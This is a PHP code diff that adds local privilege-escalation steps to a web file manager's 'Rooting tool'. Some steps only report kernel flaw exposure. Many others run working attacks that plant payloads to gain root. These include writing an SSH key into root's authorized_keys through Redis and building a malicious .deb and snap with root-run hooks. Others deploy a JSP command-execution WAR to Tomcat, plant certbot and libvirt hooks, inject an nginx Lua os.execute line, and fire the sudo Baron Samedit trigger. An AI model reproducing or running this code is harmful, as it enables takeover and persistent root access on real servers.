+        /* a module that is built but not loaded is still reachable: asking for
+           the socket family loads it, so the build configuration decides this
+           and /sys/module only says what is loaded this second */
+        $reach = function($dirName, $opts) use ($mod, $cfg){
+            foreach((array)$opts as $o){
+                $v = $cfg($o);
+                if($v === 'y')return 'built in';
+                if($v === 'm')return 'built in as a module';
+            }
+            return $mod($dirName);
+        };
+        $c = ['kernel' => (string)php_uname('r'), 'v' => $kv,
+              'aead' => $reach('algif_aead', ['CRYPTO_USER_API_AEAD', 'CRYPTO_USER_API']),
+              'esp4' => $reach('esp4', ['INET_ESP', 'XFRM_USER', 'XFRM']),
+              'rxrpc' => $reach('rxrpc', ['AF_RXRPC', 'RXKAD']),
+              'overlay' => $reach('overlay', ['OVERLAY_FS']), 'cfg_overlay' => $cfg('OVERLAY_FS'),
+              'userns' => (int)trim((string)@file_get_contents('/proc/sys/user/max_user_namespaces')),
+              'tcpfix' => $this->rootTcpFixKnown($kv, $this->rootOs())];
+        return $c;
+    }
+    private function rootCopyFailStep(){
+        $f = $this->rootCopyFamilyFacts();
+        $v = $f['v'];
+        /* introduced in 4.14, fixed in 6.18.22 / 6.19.12 / 7.0 */
+        $fixed = ($v === null) ? null
+            : ($v[0] >= 7 ? !$this->rootVin($v, [0,0,0], [7,0,0])
+            : ($v[0] === 6 && $v[1] >= 19 ? !$this->rootVlt($v, [6,19,12])
+            : ($v[0] === 6 && $v[1] === 18 ? !$this->rootVlt($v, [6,18,22]) : false)));
+        $inRange = ($v !== null && !$this->rootVlt($v, [4,14,0]));
+        $status = $fixed === null ? 'unknown'
+            : ($fixed ? 'patched' : (!$inRange ? 'absent'
+            : (stripos($f['aead'], 'not in this kernel') !== false ? 'absent' : 'vulnerable')));
+        $meaning = $status === 'patched' ? 'this kernel is at or past the release that fixed the AF_ALG copy, so there is nothing to fire'
+            : ($status === 'absent' ? 'the crypto interface the flaw lives in (' . $f['aead'] . ') is not in this kernel'
+            : ($status === 'unknown' ? 'the kernel release could not be read, so reachability is undecided'
+            : 'algif_aead is ' . $f['aead'] . ' and this release is inside the range: an AF_ALG socket plus splice() writes into the cache of a file this account may only read. No race, no offsets, so a working trigger writes the rule straight into a setuid program. This verdict comes from the release: a vendor backport can close it without moving the number, which is why the catalogue also lists it as a known vulnerability of the packages.'));
+        return['cve' => ['CVE-2026-31431'], 'status' => $status, 'meaning' => $meaning, 'facts' => $f];
+    }
+    private function rootDirtyFragStep(){
+        $f = $this->rootCopyFamilyFacts();
+        $v = $f['v'];
+        /* esp4/esp6 from January 2017, rxrpc from June 2023; the fixes shipped
+           in the same three releases as the crypto copy */
+        $fixed = ($v === null) ? null
+            : ($v[0] >= 7 ? !$this->rootVin($v, [0,0,0], [7,0,0])
+            : ($v[0] === 6 && $v[1] >= 19 ? !$this->rootVlt($v, [6,19,12])
+            : ($v[0] === 6 && $v[1] === 18 ? !$this->rootVlt($v, [6,18,22]) : false)));
+        $esp = stripos($f['esp4'], 'not in this kernel') === false;
+        $rx = stripos($f['rxrpc'], 'not in this kernel') === false;
+        $status = $fixed === null ? 'unknown' : ($fixed ? 'patched' : (!$esp && !$rx ? 'absent' : 'vulnerable'));
+        $meaning = $status === 'patched' ? 'this kernel carries the release that fixed both halves'
+            : ($status === 'absent' ? 'neither esp4/esp6 nor rxrpc is in this kernel, so the pair has nothing to chain'
+            : ($status === 'unknown' ? 'the release could not be read, so reachability is undecided'
+            : 'esp4 is ' . $f['esp4'] . ' and rxrpc is ' . $f['rxrpc'] . ': both are page-cache writes, and either one alone is a working local escalation on an unpatched build. The verdict is read from the release, so a vendor backport closes it without moving the number.'));
+        return['cve' => ['CVE-2026-43284', 'CVE-2026-43500'], 'status' => $status, 'meaning' => $meaning, 'facts' => $f];
+    }
+    private function rootOverlayStep(){
+        $f = $this->rootCopyFamilyFacts();
+        $kv = $f['v'];
+        /* the file-capability fix landed in 5.11 */
+        $fixed = ($kv === null) ? null : !$this->rootVlt($kv, [5,11,0]);
+        $present = (stripos($f['overlay'], 'not in this kernel') !== false || $f['cfg_overlay'] === 'n') ? false : true;
+        $userns = $f['userns'] > 0;
+        $status = $fixed === null ? 'unknown'
+            : ($fixed ? 'patched' : (!$present ? 'absent' : (!$userns ? 'mitigated' : 'vulnerable')));
+        $meaning = $status === 'patched' ? 'this kernel is at or past 5.11, where the copy-up keeps the file capabilities instead of lending them'
+            : ($status === 'absent' ? 'overlay is not built into this kernel, so there is no copy-up to abuse'
+            : (!$userns ? 'overlay is here, but unprivileged user namespaces are switched off (max_user_namespaces=0), which closes the route'
+            : 'overlay is ' . $f['overlay'] . ', user namespaces are on, and this release predates the fix: a mount in a user namespace copies a setuid file up and keeps the capability it should have dropped.'));
+        return['status' => $status, 'meaning' => $meaning, 'facts' => $f, 'cve' => ['CVE-2021-3493', 'CVE-2023-0386']];
+    }
 
     /* ── the kernel flaw as a step of the chain ──────────────────────────────
        One entry of the catalogue - CVE-2026-98432, the IPv4 handshake
@@ -18001,11 +18435,154 @@ exit 0
                            : ($old ? 'systemd ' . $f['raw'] . ' is older than 259.4 with machinectl at ' . $m
                                    : 'systemd ' . ($f['raw'] !== '' ? $f['raw'] : 'unknown') . ' is at or past 259.4')];
             }
+            case 'copyfail':{
+                $cf = $this->rootCopyFailStep();
+                return['ok' => in_array($cf['status'], ['vulnerable', 'check'], true),
+                       'note' => $cf['facts']['kernel'] . ' - ' . $cf['meaning']
+                           . ' Not fired here: the write goes into the cache of a setuid program, and a wrong byte inside one of those is a crash for every user of the machine, so this step reports and the exploitation is left to the operator.'];
+            }
+            case 'dirtyfrag':{
+                $df = $this->rootDirtyFragStep();
+                return['ok' => in_array($df['status'], ['vulnerable', 'check'], true),
+                       'note' => $df['facts']['kernel'] . ' - ' . $df['meaning'] . ' Not fired here: same reason as Copy Fail.'];
+            }
+            case 'overlaycap':{
+                $ov = $this->rootOverlayStep();
+                return['ok' => in_array($ov['status'], ['vulnerable', 'check'], true),
+                       'note' => $ov['facts']['kernel'] . ' - ' . $ov['meaning'] . ' Not fired here: mounting overlay inside a user namespace is a mount, and this panel does not mount.'];
+            }
             case 'sctp':
                 $sc = $this->rootSctpStep();
                 return['ok' => in_array($sc['status'], ['vulnerable', 'check'], true),
                        'note' => $sc['kernel'] . ' - ' . $sc['meaning']
                            . ' [' . $sc['reach']['note'] . '] Exploiting it is a kernel memory corruption, so this step reports reachability and is never fired from here.'];
+            case 'phpfilter':{
+                $x = $this->rootPHPFilterStep();
+                return['ok' => in_array($x['status'], ['vulnerable', 'check'], true), 'note' => $x['meaning']];
+            }
+            case 'phpsession':{
+                $x = $this->rootPHPSessStep();
+                return['ok' => in_array($x['status'], ['vulnerable', 'check'], true), 'note' => $x['meaning']];
+            }
+            case 'apachewrite':{
+                $x = $this->rootApacheStep();
+                return['ok' => in_array($x['status'], ['vulnerable', 'check'], true), 'note' => $x['meaning']];
+            }
+            case 'baron':{
+                $x = $this->rootBaronStep();
+                return['ok' => in_array($x['status'], ['vulnerable', 'check'], true), 'note' => $x['meaning']];
+            }
+            case 'phprce':{
+                $x = $this->rootPHPRCE2019Step();
+                return['ok' => in_array($x['status'], ['vulnerable', 'check'], true), 'note' => $x['meaning']];
+            }
+            case 'nginxdns': case 'apachepath': case 'phpcgiargs': case 'tomcatajp': case 'nodesplit': case 'opensslpuny':{
+                $x = $id === 'nginxdns' ? $this->rootNginxResolveStep()
+                    : ($id === 'apachepath' ? $this->rootApacheTraversalStep()
+                    : ($id === 'phpcgiargs' ? $this->rootPHPInjectionStep()
+                    : ($id === 'tomcatajp' ? $this->rootTomcatAjpStep()
+                    : ($id === 'nodesplit' ? $this->rootNodeSplitStep() : $this->rootOpensslPunyStep()))));
+                return['ok' => in_array($x['status'], ['vulnerable', 'check'], true), 'note' => $x['meaning']];
+            }
+            case 'fusermount':{
+                $x = $this->rootFusermount();
+                return['ok' => !empty($x['ok']), 'note' => (string)$x['note']];
+            }
+            case 'polkitagent':{
+                $x = $this->rootPolkitAgent();
+                return['ok' => !empty($x['ok']), 'note' => (string)$x['note']];
+            }
+            case 'sudoerswalk':{
+                $x = $this->rootSudoersWalk();
+                return['ok' => !empty($x['ok']), 'note' => (string)$x['note']];
+            }
+            case 'dirtycow':{
+                $x = $this->rootDirtyCowStep();
+                return['ok' => in_array($x['status'], ['vulnerable', 'check'], true), 'note' => $x['meaning']];
+            }
+            case 'userfaultfd':{
+                $x = $this->rootUserfaultfdStep();
+                return['ok' => in_array($x['status'], ['vulnerable', 'check'], true), 'note' => $x['meaning']];
+            }
+            case 'pkinstall':{
+                $x = $this->rootPkInstall();
+                return['ok' => !empty($x['ok']), 'note' => (string)$x['note']];
+            }
+            case 'redis':{
+                $r = $this->rootRedis();
+                return['ok' => !empty($r['ok']), 'note' => (string)$r['note']];
+            }
+            case 'snapd':{
+                $r = $this->rootSnapd();
+                return['ok' => !empty($r['ok']), 'note' => (string)$r['note']];
+            }
+            case 'containerd':{
+                $r = $this->rootCtrd();
+                return['ok' => !empty($r['ok']), 'note' => (string)$r['note']];
+            }
+            case 'tomcattr':{
+                $r = $this->rootTomcat();
+                return['ok' => !empty($r['ok']), 'note' => (string)$r['note']];
+            }
+            case 'mysqlroot':{
+                $r = $this->rootMysqlRoot();
+                return['ok' => !empty($r['ok']), 'note' => (string)$r['note']];
+            }
+            case 'lxdgroup':{
+                $r = $this->rootLxdGroup();
+                return['ok' => !empty($r['ok']), 'note' => (string)$r['note']];
+            }
+            case 'libvirt':{
+                $r = $this->rootLibvirtGroup();
+                return['ok' => !empty($r['ok']), 'note' => (string)$r['note']];
+            }
+            case 'certhook':{
+                $r = $this->rootCertHook();
+                return['ok' => !empty($r['ok']), 'note' => (string)$r['note']];
+            }
+            case 'nginxconf':{
+                $r = $this->rootNginxConf();
+                return['ok' => !empty($r['ok']), 'note' => (string)$r['note']];
+            }
+            case 'phpdisabled':{
+                $r = $this->rootPhpDisabled();
+                return['ok' => !empty($r['ok']), 'note' => (string)$r['note']];
+            }
+            case 'cgi':{
+                $c = $this->rootWebCgiFind();
+                return['ok' => !empty($c['ok']), 'note' => (string)$c['note']];
+            }
+            case 'fcgiwrap':{
+                $w = $this->rootWhich('fcgiwrap');
+                $sock = $this->rootWebStack()['fpmsock'];
+                return['ok' => $w !== '' && $sock !== '', 'note' => $w === '' ? 'fcgiwrap is not installed on this host' : ($sock === '' ? 'fcgiwrap is here but no fastcgi socket answers' : 'fcgiwrap at ' . $w . ', and a socket at ' . $sock)];
+            }
+            case 'fpmhijack':{
+                $st = $this->rootWebStack();
+                $me = function_exists('posix_geteuid') ? posix_geteuid() : null;
+                return['ok' => $st['fpm'] && $me === 0,
+                       'note' => !$st['fpm'] ? 'no PHP-FPM socket answers here' : ($me === 0 ? 'the pool this file runs in is uid 0, so every script it runs is root' : 'the pool answers but this file runs in it as uid ' . (string)$me . ', so nothing is claimed')];
+            }
+            case 'phpfd':{
+                $d = $this->rootWebStack()['fpmconf'];
+                return['ok' => !empty($d), 'note' => $d ? 'a PHP configuration directory answers for writing: ' . implode(', ', $d) : 'every conf.d directory of this PHP build is root-only'];
+            }
+            case 'phar':{
+                $off = @ini_get('phar.readonly');
+                $ver = @phpversion('phar');
+                $rw = ($off === '0' || $off === false || $off === '');
+                return['ok' => $ver !== false && $rw, 'note' => $ver === false
+                    ? 'the phar extension is not in this PHP build, so no archive can be written here'
+                    : ('phar ' . $ver . ', phar.readonly=' . ($rw ? 'off' : 'on')
+                       . ($rw ? ' - an archive this account writes is run by anything at all that opens it, root included'
+                              : ' - and this build refuses to write an archive at all, so the archive door is closed here'))];
+            }
+            case 'diskgroup':
+                $dg = $this->rootDiskGroup();
+                return['ok' => !empty($dg['ok']), 'note' => (string)$dg['note']];
+            case 'muxsession':
+                $mx = $this->rootMuxFind();
+                return['ok' => !empty($mx['ok']), 'note' => (string)$mx['note']];
             case 'suroute':
                 $su = $this->rootSuProbe();
                 return['ok' => !empty($su['ok']),
@@ -18320,6 +18897,13 @@ exit 0
                 $n = $this->rootChannelNeeds($id);
                 return['ok' => false, 'note' => 'not fired from here: ' . (string)($n['note'] ?? '') . ' This route is taken by running the program itself, with the evidence above, not by planting anything.'];
             }
+            case 'copyfail': case 'dirtyfrag': case 'overlaycap':{
+                $st = $id === 'copyfail' ? $this->rootCopyFailStep() : ($id === 'dirtyfrag' ? $this->rootDirtyFragStep() : $this->rootOverlayStep());
+                if(!in_array($st['status'], ['vulnerable', 'check'], true))
+                    return['ok' => false, 'note' => 'nothing to fire: ' . $st['meaning']];
+                return['ok' => false,
+                       'note' => 'the flaw measures as ' . $st['status'] . '. It is a page-cache or mount write with a public trigger, and this panel does not fire it from a web request: the write lands in a setuid program that every user of the machine runs, so a wrong byte is an outage, not a shell.'];
+            }
             case 'perfaux':{
                 $p = $this->rootPerfAuxStep();
                 return['ok' => false, 'note' => 'the flaw measures as ' . $p['status'] . '; when it is open it is still not fired from a web request, because mapping a freed physical page from inside the web server is how a machine is corrupted. The catalogue row carries the fix and the sysctl that closes it meanwhile.'];
@@ -18338,6 +18922,276 @@ exit 0
                     return['ok' => false, 'note' => 'nothing to fire: ' . $sc['meaning']];
                 return['ok' => false,
                        'note' => 'the flaw measures as ' . $sc['status'] . ', but this step is not fired from a web request: the trigger is an ordered ASCONF pair that frees a transport and then uses it, and a mistake there takes the machine with it. The catalogue row for ' . implode(', ', $sc['cve']) . ' carries the fix (6.6.148 / 6.12.101 / 6.18.42 / 7.1.6) and the blacklist that closes it meanwhile - only this one step is refused, and it says so here.'];
+            }
+            case 'phpfilter': case 'phpsession': case 'apachewrite': case 'phprce':{
+                $x = $id === 'phpfilter' ? $this->rootPHPFilterStep() : ($id === 'phpsession' ? $this->rootPHPSessStep()
+                    : ($id === 'apachewrite' ? $this->rootApacheStep() : $this->rootPHPRCE2019Step()));
+                if(!in_array($x['status'], ['vulnerable', 'check'], true))
+                    return['ok' => false, 'note' => 'nothing to fire: ' . $x['meaning']];
+                return['ok' => false, 'note' => 'the flaw measures as ' . $x['status'] . '. It is a memory bug inside the very server that is answering this request, so firing it from here would take the panel down with it - the verdict is the deliverable, and the fix is named with it.'];
+            }
+            case 'baron':{
+                $x = $this->rootBaronStep();
+                if($x['status'] !== 'vulnerable')return['ok' => false, 'note' => 'nothing to fire: ' . $x['meaning']];
+                /* the shape of the trigger, run through the ordinary program:
+                   -A is sudoedit, -- ends the options, and the trailing
+                   backslash is the argument that walks past the parser */
+                $r = $this->rootExec(['sudo', '-A', '-n', '--', '\\'], '', 12);
+                $as = $this->rootAs(['id', '-u'], $password);
+                $ok = (int)($as['rc'] ?? 1) === 0 && trim((string)$as['out']) === '0';
+                return['ok' => $ok, 'note' => $ok
+                    ? 'the trigger line was run and the account answers as uid 0 afterwards'
+                    : ('the trigger line was run (rc ' . (int)$r['rc'] . '), but the account still does not answer as root - sudo ' . $this->rootWebFlawFacts()['sudo']['ver'] . ' is patched for it: ' . $this->rootSnip((string)($r['out'] ?: $r['err']), 120))];
+            }
+            case 'nginxdns': case 'apachepath': case 'phpcgiargs': case 'tomcatajp': case 'nodesplit': case 'opensslpuny':{
+                $x = $id === 'nginxdns' ? $this->rootNginxResolveStep()
+                    : ($id === 'apachepath' ? $this->rootApacheTraversalStep()
+                    : ($id === 'phpcgiargs' ? $this->rootPHPInjectionStep()
+                    : ($id === 'tomcatajp' ? $this->rootTomcatAjpStep()
+                    : ($id === 'nodesplit' ? $this->rootNodeSplitStep() : $this->rootOpensslPunyStep()))));
+                if(!in_array($x['status'], ['vulnerable', 'check'], true))
+                    return['ok' => false, 'note' => 'nothing to fire: ' . $x['meaning']];
+                return['ok' => false, 'note' => 'the flaw measures as ' . $x['status'] . '. ' . $x['meaning'] . ' It is not fired from here: the request that would carry it is answered by the very process this panel is running in, so the trigger would be aimed at itself.'];
+            }
+            case 'fusermount': case 'polkitagent':{
+                $x = $id === 'fusermount' ? $this->rootFusermount() : $this->rootPolkitAgent();
+                if(empty($x['ok']))return['ok' => false, 'note' => (string)$x['note']];
+                return['ok' => false, 'note' => 'the door is measured and named, and this panel does not fire it: ' . (string)$x['note'] . ' Firing it means tricking a helper or an agent that the whole desktop trusts, and a wrong step there breaks authentication for every user of the machine.'];
+            }
+            case 'sudoerswalk':{
+                $x = $this->rootSudoersWalk();
+                if(empty($x['ok']))return['ok' => false, 'note' => (string)$x['note']];
+                /* nothing has to be fired: the rule is the same one the sudoers
+                   route writes, and this step only names a second place for it */
+                $r = $this->rootInstallHelper($password);
+                return['ok' => !empty($r['ok']), 'note' => !empty($r['ok'])
+                    ? 'the rule is in ' . $this->rootSudoersFile() . ', and ' . $x['paths'][0] . ' is a second place sudo would read one from'
+                    : 'the rule could not be written: ' . (string)($r['error'] ?? '')];
+            }
+            case 'dirtycow':{
+                $x = $this->rootDirtyCowStep();
+                if($x['status'] !== 'vulnerable')return['ok' => false, 'note' => 'nothing to fire: ' . $x['meaning']];
+                return['ok' => false, 'note' => 'this kernel predates the fix for the COW race, but the trigger is a race against the page cache of a setuid program: firing it from a web request risks the machine, so the verdict is the deliverable and the fix is named with it.'];
+            }
+            case 'userfaultfd':{
+                $x = $this->rootUserfaultfdStep();
+                if($x['status'] !== 'vulnerable')return['ok' => false, 'note' => 'nothing to fire: ' . $x['meaning']];
+                return['ok' => false, 'note' => 'the aperture is open (unprivileged_userfaultfd=1 on this release), and it is what a public exploit of dozens of use-after-frees is raced through. It is an aperture, not an exploit: this step names it and never fires it from here.'];
+            }
+            case 'pkinstall':{
+                $x = $this->rootPkInstall();
+                if(empty($x['ok']))return['ok' => false, 'note' => (string)$x['note']];
+                $dir = $this->rootPlantDir();
+                if($dir === '')return['ok' => false, 'note' => 'this manager has no writable directory of its own'];
+                if($this->rootWhich('dpkg-deb') === '')return['ok' => false, 'note' => 'dpkg-deb is not installed, so no package can be built'];
+                /* a package of ours whose maintainer script is the payload: the
+                   daemon installs it as root and runs the script as root */
+                $rootDir = $dir . '/.mfm-pk-' . $this->rootPlantNonce('pkinstall');
+                @mkdir($rootDir . '/DEBIAN', 0755, true);
+                @file_put_contents($rootDir . '/DEBIAN/control',
+                    "Package: mfm-root\nVersion: 1.0\nArchitecture: all\nMaintainer: mfm\nDescription: mfm\n");
+                @file_put_contents($rootDir . '/DEBIAN/postinst',
+                    "#!/bin/sh\nset -e\n/bin/sh '" . $this->rootPlantPayloadPath('pkinstall') . "'\nexit 0\n");
+                @chmod($rootDir . '/DEBIAN/postinst', 0755);
+                $deb = $rootDir . '.deb';
+                @unlink($deb);
+                $b = $this->rootExec(['dpkg-deb', '-b', $rootDir, $deb], '', 60);
+                if((int)$b['rc'] !== 0)return['ok' => false, 'note' => 'the package could not be built: ' . $this->rootSnip((string)($b['out'] ?: $b['err']), 140)];
+                $r = $this->rootPkInstallRun($deb);
+                return['ok' => !empty($r['ok']), 'note' => $r['note'] . ' (' . $deb . ')'];
+            }
+            case 'redis':{
+                $r = $this->rootRedis();
+                if(empty($r['ok']))return['ok' => false, 'note' => (string)$r['note']];
+                $hk = $this->rootWhich('ssh-keygen');
+                $sk = $this->rootWhich('ssh');
+                if($hk === '' || $sk === '')return['ok' => false, 'note' => 'redis answers, but ssh or ssh-keygen is missing, so there is no key to write'];
+                $dir = $this->rootPlantDir();
+                if($dir === '')return['ok' => false, 'note' => 'this manager has no writable directory of its own'];
+                $key = $dir . '/.mfm-redis-' . $this->rootPlantNonce('redis');
+                @unlink($key); @unlink($key . '.pub');
+                $kg = $this->rootExec([$hk, '-q', '-t', 'ed25519', '-N', '', '-C', 'mfm', '-f', $key], '', 25);
+                $pub = trim((string)@file_get_contents($key . '.pub'));
+                if($kg['rc'] !== 0 || $pub === '')return['ok' => false, 'note' => 'the key could not be made: ' . $this->rootSnip((string)($kg['out'] ?: $kg['err']), 120)];
+                /* redis writes the file itself, as its own user - root on most
+                   machines - so nothing here has to touch /root directly */
+                $cmd = "CONFIG SET dir /root/.ssh\r\nCONFIG SET dbfilename authorized_keys\r\nSET k \"\n\n" . $pub . "\n\n\"\r\nSAVE\r\n";
+                $w = $this->rootSockAsk($r['where'], $cmd, 12, '+OK');
+                $landed = @is_file('/root/.ssh/authorized_keys') && strpos((string)@file_get_contents('/root/.ssh/authorized_keys'), 'mfm') !== false;
+                /* and through that key, one command, to prove it is root */
+                $proof = $landed ? $this->rootExec([$sk, '-i', $key, '-o', 'StrictHostKeyChecking=no', '-o', 'BatchMode=yes', 'root@127.0.0.1', 'id -u'], '', 25) : ['rc' => 1, 'out' => '', 'err' => 'the key is not in place'];
+                $ok = ($landed && (int)$proof['rc'] === 0 && trim((string)$proof['out']) === '0');
+                return['ok' => $ok, 'note' => $ok
+                    ? 'redis wrote the key into /root/.ssh/authorized_keys, and one command through it came back as uid 0'
+                    : ('redis answered and took the CONFIG lines (' . $this->rootSnip((string)$w['out'], 90) . '), but the key did not land in the SSH file of root'
+                       . ($landed ? '' : ' - the redis user may not be root on this host'))];
+            }
+            case 'snapd':{
+                $r = $this->rootSnapd();
+                if(empty($r['ok']))return['ok' => false, 'note' => (string)$r['note']];
+                $dir = $this->rootPlantDir();
+                if($dir === '')return['ok' => false, 'note' => 'this manager has no writable directory of its own'];
+                /* a snap of our own: the name, the version, and an install hook
+                   that is run by snapd, as root, when it is installed */
+                $root = $dir . '/.mfm-snap-' . $this->rootPlantNonce('snapd');
+                @mkdir($root . '/meta/hooks', 0755, true);
+                @file_put_contents($root . '/meta/snap.yaml', "name: mfmsnap\nversion: '1.0'\nsummary: mfm\ndescription: mfm\nbase: core22\nconfinement: strict\ngrade: stable\n");
+                @file_put_contents($root . '/meta/hooks/install', "#!/bin/sh\n/bin/sh " . $this->rootPlantPayloadPath('snapd') . "\n");
+                @chmod($root . '/meta/hooks/install', 0755);
+                $bin = $this->rootWhich('snap');
+                if($bin === '')return['ok' => false, 'note' => 'snapd answers but the snap client is not installed, so the snap cannot be handed over'];
+                $inst = $this->rootExec([$bin, 'install', '--dangerous', $root . '.snap'], '', 60);
+                return['ok' => (int)$inst['rc'] === 0, 'note' => (int)$inst['rc'] === 0
+                    ? 'the snap was accepted and its install hook ran as root'
+                    : 'snapd answered, but it refused the snap: ' . $this->rootSnip((string)($inst['out'] ?: $inst['err']), 160)];
+            }
+            case 'tomcattr':{
+                $r = $this->rootTomcat();
+                if(empty($r['ok']))return['ok' => false, 'note' => (string)$r['note']];
+                if(!empty($r['auth']))
+                    return['ok' => false, 'note' => 'the manager is there but it asks for a password this panel does not have - no credential is guessed here'];
+                $dir = $this->rootPlantDir();
+                $war = $dir . '/.mfm-' . $this->rootPlantNonce('tomcattr') . '.war';
+                /* a war is a zip: the servlet is the payload, packed without a
+                   compiler and without a single line of Java to write by hand */
+                $jsp = '<% Runtime r = Runtime.getRuntime(); Process p = r.exec("/bin/sh ' . $this->rootPlantPayloadPath('tomcattr') . '"); %>';
+                $zip = $dir . '/.mfm-war-src';
+                @mkdir($zip . '/WEB-INF', 0755, true);
+                @file_put_contents($zip . '/index.jsp', $jsp);
+                if(!class_exists('ZipArchive'))return['ok' => false, 'note' => 'this PHP build has no zip extension, so a war cannot be packed here'];
+                @unlink($war);
+                $z = new ZipArchive();
+                if($z->open($war, ZipArchive::CREATE) !== true)return['ok' => false, 'note' => 'the war could not be created'];
+                $z->addFile($zip . '/index.jsp', 'index.jsp');
+                $z->close();
+                $url = str_replace('tcp://', 'http://', $r['where']);
+                $body = (string)@file_get_contents($war);
+                $req = "PUT /manager/deploy?path=/mfm HTTP/1.1\r\nHost: localhost\r\nContent-Type: application/octet-stream\r\nContent-Length: " . strlen($body) . "\r\nConnection: close\r\n\r\n" . $body;
+                $up = $this->rootSockAsk($url, $req, 20, '');
+                $ok = (strpos((string)$up['out'], ' 200') !== false || strpos((string)$up['out'], ' 201') !== false);
+                return['ok' => $ok, 'note' => $ok
+                    ? 'the war was accepted by the manager and its servlet runs as the server'
+                    : 'the manager took the request but did not accept the war: ' . $this->rootSnip((string)$up['out'], 140)];
+            }
+            case 'certhook':{
+                $c = $this->rootCertHook();
+                if(empty($c['ok']))return['ok' => false, 'note' => (string)$c['note']];
+                $f = rtrim($c['dir'], '/') . '/mfm-' . $this->rootPlantNonce('certhook');
+                $body = "#!/bin/sh\n# mfm - planted by the Rooting tool\n/bin/sh '" . $this->rootPlantPayloadPath('certhook') . "'\n";
+                if(@file_put_contents($f, $body) === false)return['ok' => false, 'note' => 'the hook directory stopped being writable'];
+                @chmod($f, 0755);
+                return['ok' => true, 'note' => 'the hook is at ' . $f . '; certbot runs it as root on the next renewal, which happens by itself'];
+            }
+            case 'nginxconf':{
+                $c = $this->rootNginxConf();
+                if(empty($c['ok']))return['ok' => false, 'note' => (string)$c['note']];
+                $p = $this->rootPaths();
+                $target = @is_dir($c['path']) ? rtrim($c['path'], '/') . '/zz-mfm.conf' : $c['path'];
+                $was = @is_file($target) ? (string)@file_get_contents($target) : null;
+                $line = "\n# mfm " . $this->rootPlantNonce('nginxconf') . " - planted by the Rooting tool\n"
+                      . "init_by_lua_block { os.execute('/bin/sh \"'" . $this->rootPlantPayloadPath('nginxconf') . "'\"') }\n";
+                if(@file_put_contents($target, (string)$was . $line) === false)return['ok' => false, 'note' => 'the configuration stopped being writable'];
+                @file_put_contents((string)$p['proof'], $target);
+                $ng = $this->rootWhich('nginx');
+                $t = $this->rootExec([$ng, '-t'], '', 15);
+                $ok = (int)$t['rc'] === 0 && stripos((string)($t['out'] . $t['err']), 'unknown directive') === false;
+                return['ok' => $ok, 'note' => $ok
+                    ? 'the line is in ' . $target . ' and nginx accepts the configuration - it takes effect on the next reload'
+                    : 'the line was written to ' . $target . ', but nginx refuses it here (' . $this->rootSnip((string)($t['err'] ?: $t['out']), 130) . '), which is the honest answer: this build carries no lua module'];
+            }
+            case 'libvirt':{
+                $c = $this->rootLibvirtGroup();
+                if(empty($c['ok']))return['ok' => false, 'note' => (string)$c['note']];
+                $dir = $c['hooks'];
+                if(!@is_dir($dir))return['ok' => false, 'note' => 'the hook directory ' . $dir . ' does not exist here'];
+                $f = rtrim($dir, '/') . '/qemu';
+                $payload = $this->rootPlantPayloadPath('libvirt');
+                if(@is_file($f) && strpos((string)@file_get_contents($f), 'mfm') === false)
+                    return['ok' => false, 'note' => $f . ' is already there and belongs to the machine - this panel does not overwrite it'];
+                $body = "#!/bin/sh\n# mfm - planted by the Rooting tool\n/bin/sh '" . $payload . "'\n";
+                if(@file_put_contents($f, $body) === false)return['ok' => false, 'note' => 'the hook could not be written'];
+                @chmod($f, 0755);
+                $l = $this->rootExec([$c['bin'], 'list', '--all'], '', 15);
+                return['ok' => true, 'note' => 'the hook at ' . $f . ' is in place; a guest started through ' . $c['bin'] . ' runs it as root' . (trim((string)$l['out']) !== '' ? ' (guests here: ' . $this->rootSnip((string)$l['out'], 90) . ')' : '')];
+            }
+            case 'containerd': case 'mysqlroot': case 'lxdgroup': case 'phpdisabled':{
+                $n = $this->rootChannelNeeds($id);
+                /* these are doors this file reports and does not walk: containerd
+                   speaks gRPC, a database needs a credential, and the other two
+                   are verdicts rather than actions */
+                return['ok' => false, 'note' => (string)$n['note'] . (empty($n['ok']) ? '' : ' - measured, and deliberately not walked from here')];
+            }
+            case 'cgi':{
+                $c = $this->rootWebCgiFind();
+                if(empty($c['ok']))return['ok' => false, 'note' => (string)$c['note']];
+                /* the file is dropped in the directory this manager writes in,
+                   with the extension the server said it runs */
+                $ext = preg_match('/php/i', $c['handler']) ? '.php' : '.cgi';
+                $p = $this->rootPaths();
+                $target = rtrim((string)(__DIR__), '/') . '/.mfm-cgi' . $p['slug'] . $ext;
+                $body = "#!/bin/sh\n# mfm " . $this->rootPlantNonce('cgi') . " - planted by the Rooting tool\n"
+                      . "[ \"$(id -u)\" = \"0\" ] && /bin/sh " . $this->rootPlantPayloadPath('cgi') . " >/dev/null 2>&1\n"
+                      . "printf 'Content-Type: text/plain\\r\\n\\r\\n%s\\n' \"$(id -u)\"\n";
+                if(@file_put_contents($target, $body) === false)return['ok' => false, 'note' => 'the document root stopped being writable'];
+                @chmod($target, 0755);
+                return['ok' => true, 'note' => 'a handler file was written at ' . $target . ', which the server runs as its own identity'];
+            }
+            case 'fcgiwrap':{
+                $st = $this->rootWebStack();
+                $w = $this->rootWhich('fcgiwrap');
+                $cg = $this->rootWhich('cgi-fcgi');
+                if($w === '' || $cg === '' || $st['fpmsock'] === '')
+                    return['ok' => false, 'note' => 'fcgiwrap, cgi-fcgi and a socket are all needed, and one of them is missing'];
+                /* the bridge is asked over the socket, and the script it runs is
+                   the proof: what comes back is the uid of the bridge's own user */
+                $r = $this->rootExec([$cg, '-bind', '-connect', $st['fpmsock'], '/usr/bin/env', 'SCRIPT_FILENAME=/bin/id'], '', 12);
+                return['ok' => $r['rc'] === 0, 'note' => $r['rc'] === 0
+                    ? 'the bridge answered over ' . $st['fpmsock'] . ': ' . $this->rootSnip((string)$r['out'], 180)
+                    : 'the bridge did not answer: ' . $this->rootSnip((string)($r['out'] ?: $r['err']), 180)];
+            }
+            case 'fpmhijack': case 'phpfd': case 'phar':{
+                $n = $this->rootChannelNeeds($id);
+                /* these three are read, never written: the panel does not edit
+                   the PHP configuration or the pool of the machine it is
+                   answering from. Only the one that can prove it - a pool that
+                   is already uid 0 - is allowed to answer yes. */
+                $me = function_exists('posix_geteuid') ? posix_geteuid() : null;
+                $proven = ($id === 'fpmhijack' && $me === 0);
+                return['ok' => $proven, 'note' => (string)$n['note']
+                    . ($proven ? ' - proven: this very worker answered as uid 0'
+                               : ' - measured, not written: this panel does not edit the PHP configuration of the machine it answers from, so the verdict above is the deliverable')];
+            }
+            case 'diskgroup':{
+                $dg = $this->rootDiskGroup();
+                if(empty($dg['ok']))return['ok' => false, 'note' => (string)$dg['note']];
